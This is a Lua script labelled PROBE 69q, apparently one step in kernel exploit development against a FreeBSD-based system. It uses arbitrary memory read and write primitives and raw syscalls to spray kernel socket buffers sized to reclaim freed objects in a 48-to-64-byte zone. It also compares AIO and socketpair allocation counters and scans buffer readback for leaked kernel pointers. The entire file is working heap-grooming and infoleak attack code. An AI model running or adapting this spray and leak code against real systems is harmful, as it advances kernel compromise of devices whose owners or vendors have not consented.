-- CRASH_CLASS: MODERATE
-- PROBE 69q: Pipe buffer spray for R-object zone reclaim
--
-- Pipe buffers are the classic FreeBSD heap spray primitive. pipe(42) returns
-- -1 via make_syscall, BUT pipe2(542) may work (FreeBSD 11+, not yet tested).
-- socketpair(135) works and allocates kernel socket buffers.
--
-- Strategy:
--   [A] Test pipe2(542) — if it works, pipe buffers are available
--   [B] Write-sized messages to socketpair fds to create kernel buffers
--       of controlled size (matching R's 48B→64B zone)
--   [C] AIO free → pipe/socket buffer spray → readback via read()
--   [D] 624 delta comparison: AIO vs pipe vs socket creation
--
-- Key: if kernel socket receive buffers share R's zone, writing a 48B
-- message creates a 64B-bucket allocation that can reclaim freed R slots.

print("=== PROBE 69q: PIPE/SOCKET BUFFER SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local function read_624()
    local r = nil
    pcall(function() r = mk(624)(uint64(0)) end)
    return r and N(r) or nil
end

-- ============================================================
-- [A] TEST pipe2(542) — FreeBSD 11+ non-POSIX pipe
-- ============================================================
print("[A] Testing pipe2(542)")
local pipe_fds = memory.alloc(16)
wd(N(pipe_fds), 0xFFFFFFFF); wd(N(pipe_fds) + 4, 0xFFFFFFFF)
local ret542 = nil
pcall(function() ret542 = mk(542)(uint64(N(pipe_fds)), uint64(0)) end)
local p2r = ret542 and sgn(ret542) or -999
local pfd0 = rd(N(pipe_fds)) or -1
local pfd1 = rd(N(pipe_fds) + 4) or -1
print(string.format("  pipe2(542): ret=%d fds=[%d, %d]", p2r, pfd0, pfd1))
if p2r == 0 and pfd0 >= 0 then
    print("  *** PIPE2 WORKS — pipe buffers available ***")
    pcall(function() mk(6)(uint64(pfd0)) end)
    pcall(function() mk(6)(uint64(pfd1)) end)
else
    print("  pipe2 blocked (expected, pipe(42) also returns -1)")
end

-- Also try sys 42 (pipe) via make_syscall for completeness
wd(N(pipe_fds), 0xFFFFFFFF); wd(N(pipe_fds) + 4, 0xFFFFFFFF)
local ret42 = nil
pcall(function() ret42 = mk(42)(uint64(N(pipe_fds))) end)
local p42r = ret42 and sgn(ret42) or -999
print(string.format("  pipe(42): ret=%d fds=[%d, %d]", p42r, rd(N(pipe_fds)) or -1, rd(N(pipe_fds) + 4) or -1))

if not alive() then print("DEAD after section A"); return end

-- ============================================================
-- [B] SOCKETPAIR BUFFER SPRAY
-- Create many socketpairs and write small messages (48-64 bytes)
-- to generate kernel mbuf/cluster allocations in R's size range.
-- ============================================================
print("")
print("[B] Socketpair buffer spray (sized messages)")

local b624 = read_624()
local msg_sizes = {32, 48, 64, 96, 128}
local sp_pairs = {}

for _, msize in ipairs(msg_sizes) do
    if not alive() then break end
    local pre = read_624()
    local created = 0

    for i = 1, 50 do
        local sp = memory.alloc(16)
        wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
        pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sp))) end)
        local rfd = rd(N(sp)) or -1
        local wfd = rd(N(sp) + 4) or -1
        if rfd >= 0 and wfd >= 0 then
            created = created + 1
            sp_pairs[#sp_pairs + 1] = {r = rfd, w = wfd}

            -- Write msize bytes of sentinel pattern
            local wbuf = memory.alloc(msize + 8)
            for off = 0, msize - 4, 4 do
                wd(N(wbuf) + off, 0xCAFE0000 + i)
            end
            pcall(function()
                mk(4)(uint64(wfd), uint64(N(wbuf)), uint64(msize))
            end)
        end
    end

    local post = read_624()
    local delta = (pre and post) and (post - pre) or -1
    print(string.format("  msg_size=%d: created=%d pairs, 624 delta=%d", msize, created, delta))
end

print(string.format("  total socketpairs: %d", #sp_pairs))
if not alive() then print("DEAD after section B"); return end

-- ============================================================
-- [C] 624 COMPARISON: AIO vs socketpair creation rates
-- ============================================================
print("")
print("[C] 624 delta comparison: AIO submit vs socketpair create")

-- AIO submit 100
local pre_aio = read_624()
local aio_ids = {}
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("  fd_zero=" .. fd_zero)

if fd_zero >= 0 then
    for i = 1, 100 do
        wq(N(reqs), uint64(0))
        wq(N(reqs) + 8, uint64(16))
        local bh, bl = get_hi_lo(uint64(N(data_buf)))
        wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
        local rh, rl = get_hi_lo(uint64(N(result_buf)))
        wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
        wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
        wd(N(one_id), 0)
        pcall(function()
            mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
        end)
        local id = rd(N(one_id)) or 0
        if id ~= 0 then aio_ids[#aio_ids + 1] = id end
    end
    local post_aio = read_624()
    print(string.format("  100 AIO submit: 624 delta=%s",
        (pre_aio and post_aio) and tostring(post_aio - pre_aio) or "?"))

    -- Poll + delete AIO
    for _, id in ipairs(aio_ids) do
        wd(N(one_id), id); wd(N(one_st), 0)
        pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end
    for _, id in ipairs(aio_ids) do
        wd(N(one_id), id); wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end
end

-- Socketpair create 100
local pre_sp = read_624()
local sp2 = {}
for i = 1, 100 do
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sp))) end)
    local rfd = rd(N(sp)) or -1
    local wfd = rd(N(sp) + 4) or -1
    if rfd >= 0 then sp2[#sp2 + 1] = {r = rfd, w = wfd} end
end
local post_sp = read_624()
print(string.format("  100 socketpair: 624 delta=%s",
    (pre_sp and post_sp) and tostring(post_sp - pre_sp) or "?"))

if not alive() then print("DEAD after section C"); return end

-- ============================================================
-- [D] READ BACK from socketpair: check for kernel pointer leaks
-- ============================================================
print("")
print("[D] Socketpair readback — checking for leaked data")

local rbuf = memory.alloc(256)
local kptr_count = 0
for i, pair in ipairs(sp_pairs) do
    if i > 30 then break end
    if not alive() then break end

    -- Zero buffer
    for off = 0, 252, 4 do wd(N(rbuf) + off, 0) end

    -- Read from the read fd
    local rr = nil
    pcall(function()
        rr = mk(3)(uint64(pair.r), uint64(N(rbuf)), uint64(200))
    end)
    local bytes_read = rr and sgn(rr) or -1

    if bytes_read > 0 then
        -- Scan for kernel pointers
        for off = 0, bytes_read - 8, 4 do
            local val = rq(N(rbuf) + off)
            if val then
                local vh, vl = get_hi_lo(val)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kptr_count = kptr_count + 1
                    print(string.format("  *** KPTR *** pair=%d off=%d val=%s",
                        i, off, fmt(val)))
                end
            end
        end
    end
end

print(string.format("  kernel pointers found: %d", kptr_count))

-- ============================================================
-- [E] CLEANUP
-- ============================================================
print("")
print("[E] Cleanup")
local closed = 0
for _, pair in ipairs(sp_pairs) do
    pcall(function() mk(6)(uint64(pair.r)) end)
    pcall(function() mk(6)(uint64(pair.w)) end)
    closed = closed + 1
end
for _, pair in ipairs(sp2) do
    pcall(function() mk(6)(uint64(pair.r)) end)
    pcall(function() mk(6)(uint64(pair.w)) end)
    closed = closed + 1
end

local final_624 = read_624()
print(string.format("  closed %d pairs, 624 final=%s", closed, tostring(final_624)))

print("")
print("KPTR_TOTAL=" .. kptr_count)
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69q COMPLETE ===")
